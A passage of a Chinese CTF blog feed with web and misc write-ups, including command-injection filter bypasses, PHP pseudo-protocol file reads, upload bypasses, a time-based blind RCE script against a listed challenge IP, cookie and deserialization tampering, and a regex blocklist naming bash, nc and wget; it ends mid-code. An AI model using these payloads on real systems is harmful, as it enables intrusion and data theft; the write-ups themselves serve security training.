class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反斜杠绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754232441482-e43a3247-13d6-42a2-903a-f0eb363dba7a.png"></p><h1 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a><font style="color:rgb(48, 49, 51);">finalrce</font></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 tee 命令</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754233186632-e3b12e78-eacc-47e0-831d-8b46ccbac180.png"></p><p>访问 1.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754233197811-a2074875-079a-40d6-b700-37ca4d4b3ace.png"></p><p>访问flllllaaaaaaggggggg，注意 la 被 ban 了，加一个问号进行绕过。</p><p>&#x2F;?url&#x3D;tac &#x2F;flllll?aaaaaggggggg|tee 1.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754233836807-6de9ffb9-4b90-4d6d-9fc6-aa0e7e94e27e.png"></p><h1 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a><font style="color:rgb(48, 49, 51);">PseudoProtocols</font></h1><p>php 伪协议直接读文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754233967533-47e8e52e-3146-4af0-8976-cd3a1aae99ac.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 data 伪协议可以直接让 file_get_contents()直接返回改字符串</p><p>?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I want flag</p><h1 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a><font style="color:rgb(48, 49, 51);">easyupload1.0</font></h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754235278273-cbd313ff-6b44-48cc-8459-de4a1856f4f9.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754235197710-b8d24f25-a3cb-45e0-830b-5e4a582b6010.png"></p><p>ez_upload</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754235240261-abca8fc2-5225-4fee-9c7a-1128e66869d1.png"></p><p>wc，fakeflag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236074271-18b96115-e06f-45e6-a21c-036c824dc2a2.png"></p><p>改你文件！！！看看 phpinfo</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236050183-86f7417e-770b-41a4-bf44-32e5376e7b4b.png"></p><p>flag 在此</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236124655-355bfb3c-2955-42ba-9d5c-a73d4a022228.png"></p><h1 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a><font style="color:rgb(48, 49, 51);">easyupload2.0</font></h1><p>爆破试试，结果 phtml 成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236454841-ce8b9557-8653-448c-935e-944d156e26de.png"></p><p>文件有点多了 hh</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236498606-3429e0b6-a32b-4c2d-879f-cd36f5288634.png"></p><p>不是假 flag 了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754236519085-f8fa16d4-ab57-4f0e-9008-55ab2828ec75.png"></p><h1 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a><font style="color:rgb(48, 49, 51);">easyupload3.0</font></h1><p>.htaccess 文件绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754237595375-9a770a76-5bf0-4226-8390-bec852a1cb94.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754237581432-f41a5357-fc95-491c-8a6a-7a54df069ca3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754237634658-924a2083-fd2b-4abd-988a-786ba7852967.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025御网杯wp</title>
      <link href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="排名及解题情况"><a href="#排名及解题情况" class="headerlink" title="排名及解题情况"></a>排名及解题情况</h1><p>全国排名：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236960665-6896dc2a-db4a-4c1b-b624-c868af91f172.png"></p><p>校内排名：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236974900-9cc56df9-0c4c-43a4-b5c9-fe9f8cbb0a65.png"></p><p>Misc 方向：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236968665-1ff24064-4e5b-44cd-a3b7-a481c2d9c4e5.png"></p><p>Crypto 方向：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236982933-018cf965-9522-4fd8-b697-5ce3cc0e2093.png"></p><p>Web 方向：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236945920-f43077cd-fd7d-448d-8e0b-47f4b7b535bc.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592825-7abaea37-b181-4908-a842-50e0948192a3.png"></p><p>1.打开网页发现有一串php代码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234593101-2a9e471c-4ce6-4226-aee8-448b74cb53a0.png"></p><p>二、解题思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$res</span>,<span class="variable">$rc</span>);</span><br><span class="line">    <span class="comment">//echo $rc;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It works!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2.进行分析</p><p>无回显rce,因为提示flag在&#x2F;flag.txt里,所以直接时间盲注就行了,把文件里的内容时间盲注出来就行了</p><p>3.脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://47.105.113.86:40005&quot;</span></span><br><span class="line">charset = string.printable</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;if [ &quot;$(cut -c<span class="subst">&#123;i&#125;</span> /flag.txt)&quot; = &quot;<span class="subst">&#123;c&#125;</span>&quot; ]; then sleep 5; fi&#x27;&#x27;&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=&#123;<span class="string">&quot;cmd&quot;</span>: payload&#125;, timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; timeout_threshold:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;End<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        Break</span><br></pre></td></tr></table></figure><p>4.flag以及时间如下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234593775-9d8bbd46-f286-4258-a132-b1ebf323df4b.png"></p><h2 id="YWB-Web-xff"><a href="#YWB-Web-xff" class="headerlink" title="YWB_Web_xff"></a>YWB_Web_xff</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594126-a55d983e-a309-486a-88a8-78e81a39f7c8.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594361-9794e418-4e92-4075-ae82-dfdaf330b372.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594703-60812545-14ee-4fe2-bace-bb2b49f144f9.png"></p><p>二、解题思路</p><p>1.看源码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595159-7d1d94da-0b8a-47ee-8ca7-651849f65e2d.png"></p><p>2.分析源码</p><p>重点在<font style="color:#001080;">$cip</font><font style="color:#000000;"> &#x3D;&#x3D; </font><font style="color:#A31515;">“2.2.2.1</font>上,说明要用xff伪造ip为2.2.2.1,</p><p>3.进行网页操作</p><p>输入1和1,hackbar进行操作</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595502-3ab2703d-a778-407a-9693-99ec45b3eb9b.png"></p><p>在X-Forwarded-For插入2.2.2.1就行了,flag和时间如下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595810-375972be-eea8-49c4-8515-14883286202e.png"></p><h2 id="YWB-Web-未授权访问"><a href="#YWB-Web-未授权访问" class="headerlink" title="YWB_Web_未授权访问"></a>YWB_Web_未授权访问</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596105-10851c72-101e-4149-a7ac-497fcbbe9f1f.png"></p><p>二、解题思路</p><p>看看cookie发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22guest%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure><p>Url解码得到</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596344-12c7290f-0bbe-4c23-afc1-3bf92922b73f.png"></p><p>把后面的0改为1,guest改为admin就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>flag以及时间如下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596777-62eeb39f-b543-4829-8baa-da54dc9bb48a.png"></p><h2 id="YWB-Web-命令执行过滤绕过"><a href="#YWB-Web-命令执行过滤绕过" class="headerlink" title="YWB_Web_命令执行过滤绕过"></a>YWB_Web_命令执行过滤绕过</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597034-9f208b6c-b5a7-4cff-b99b-47e8d3596e5e.png"></p><p>二、解题思路</p><p>1.分析代码</p><p>看了下php代码,发现var_dump没有被ban,所以可以使用var_dump函数,并且命令里必须包含flag字眼,不仅如此,文件读取函数ffile_get_contents也允许使用,所以构造playload:?cmd&#x3D;var_dump(base64_encode(file_get_contents(‘flag.php’)));</p><p>2.进行漏洞利用</p><p>试一下这个playload出现了一串base64编码的字符</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597317-b8c89e33-2805-4d95-a927-01258c07f27f.png"></p><p>Cyberchef解码一下看看<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597594-115c0a8f-f5e6-4412-846c-52ecb80ad2ab.png"></p><p>说明flag.php是这样的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&quot;/tmp/flag.nisp&quot;</span>;</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>出现了&#x2F;tmp&#x2F;flag.nisp比较奇怪的文件,看看呢playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=var_dump(base64_encode(file_get_contents(&#x27;/tmp/flag.nisp&#x27;)));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597921-0f0399e3-662c-4b5b-9446-d13ab7a201f4.png"></p><p>3.得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598164-d31a8e98-3c26-4657-80bc-213467ecf280.png"></p><h2 id="YWB-Web-反序列化"><a href="#YWB-Web-反序列化" class="headerlink" title="YWB_Web_反序列化"></a>YWB_Web_反序列化</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598446-e459df21-9a86-4b8c-a545-853f002f3d6d.png"></p><p>下载的源码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598745-9914e633-dd3a-4668-83aa-2d23262487db.png"></p><p>二、解题思路</p><p>1.分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$filtered_input</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$filtered_input</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> mylogin) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>-&gt;pass === <span class="string">&quot;myzS@11wawq&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$tis</span> = <span class="string">&quot;您是小自吧,差一点就成功了!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$tis</span> = <span class="string">&quot;您输入的信息可能去非洲才能找到哦!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交的字符串中不能有flag和hack,否则就被替换成hack,影响反序列化。再看后面的if,需要我们的序列化的字符串pass &#x3D;&#x3D;&#x3D; myzS@11wawq,这样就绕过成功了</p><p>2.构造playload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span> = <span class="string">&quot;test&quot;</span>, <span class="variable">$pass</span> = <span class="string">&quot;myzS@11wawq&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>输出结果是：O:7:”mylogin”:2:{s:4:”user”;s:4:”test”;s:4:”pass”;s:11:”myzS@11wawq”;}</p><p>3.得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599008-ca82b0bb-86c8-49e3-aeeb-39e2e2de4d83.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="光隙中的寄生密钥"><a href="#光隙中的寄生密钥" class="headerlink" title="光隙中的寄生密钥"></a>光隙中的寄生密钥</h2><p>一、题目截图</p><p>解压后的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599286-b5d2e5a2-9bba-41a8-86a1-5211d6bc08f2.png"></p><p>二、解题思路</p><p><font style="color:#515A6E;">拖进010editor进行分析</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599606-073a5374-0f47-4e0c-b40d-165795ae75bd.png"></p><p>发现最后面有PK开头的,说明藏了一个压缩包</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599930-ba128366-db8b-47c9-9fc3-62f133614110.png"></p><p>拖进kali进行分离</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600330-d614e4cd-9580-482d-aa71-a63e0ae66245.png"></p><p>再把压缩包拖回到windows里</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600670-514e55df-0191-45d8-8c12-3ebfb83d01c2.png"></p><p>解压发现需要密码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600948-8172e138-df78-49c9-be96-8c3967716b26.png"></p><p>进行压缩包密码爆破</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601294-a4620bda-0787-4bcc-a8d3-7e604863116c.png"></p><p>发现有flag.txt,打开看看,是一串16进制的字符</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601538-bf60c69a-291a-4de7-8577-faf1be4e1c9c.png"></p><p>Cyberchef看看</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601787-05bc5b10-21a9-4262-963a-f7f74716e190.png"></p><p>解码后又是base64编码的字符</p><p>解码后flag:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602104-d7147b06-f6e2-44c7-b320-40908f032589.png"></p><h2 id="misc草甸方阵的密语"><a href="#misc草甸方阵的密语" class="headerlink" title="misc草甸方阵的密语"></a>misc草甸方阵的密语</h2><p>一、题目截图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602380-9d624462-b592-47fe-9569-3b7c8e1e24cb.png"></p><p>二、解题思路</p><p>1.看文件</p><p>记事本看看.exe文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602729-7073398f-6c8e-4b2b-a618-86115d78432d.png"></p><p>发现是一串密码,根据题目提示的栅栏可凯撒,不难猜出这是栅栏加密和凯撒加密</p><p>2.代码解密</p><p>先栅栏密码解密</p><p>解密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_fence_cipher</span>(<span class="params">ciphertext, num_rails</span>):</span><br><span class="line">    rail_length = <span class="built_in">len</span>(ciphertext) // num_rails</span><br><span class="line">    extra_chars = <span class="built_in">len</span>(ciphertext) % num_rails</span><br><span class="line">    rails = [<span class="string">&#x27;&#x27;</span>] * num_rails</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_rails):</span><br><span class="line">        <span class="keyword">if</span> i &lt; extra_chars:</span><br><span class="line">            rails[i] = ciphertext[index:index + rail_length + <span class="number">1</span>]</span><br><span class="line">            index += rail_length + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rails[i] = ciphertext[index:index + rail_length]</span><br><span class="line">            index += rail_length</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rail_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> rail <span class="keyword">in</span> rails:</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(rail):</span><br><span class="line">                plaintext += rail[i]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_fence_cipher</span>(<span class="params">ciphertext, min_rails, max_rails</span>):</span><br><span class="line">    <span class="keyword">for</span> num_rails <span class="keyword">in</span> <span class="built_in">range</span>(min_rails, max_rails + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = decrypt_fence_cipher(ciphertext, num_rails)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[栏数 <span class="subst">&#123;num_rails:2d&#125;</span>] 解密结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[栏数 <span class="subst">&#123;num_rails:2d&#125;</span>] 出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">ciphertext = <span class="string">&quot;k9qrfSl6&#123;uOV78pW32iXQ&#125;&quot;</span></span><br><span class="line">test_fence_cipher(ciphertext, <span class="number">2</span>, <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>输出结果如下,其中 kqfl{O7p3iQ9rS6uV8W2X}最可疑,很像flag的形式</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234603259-0d10e0bf-39a2-424a-b2e2-3d8c3952977c.png"></p><p>之后进行凯撒解密,解密代码如下,当偏移量为5的时候才正确,并且保持数字不动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 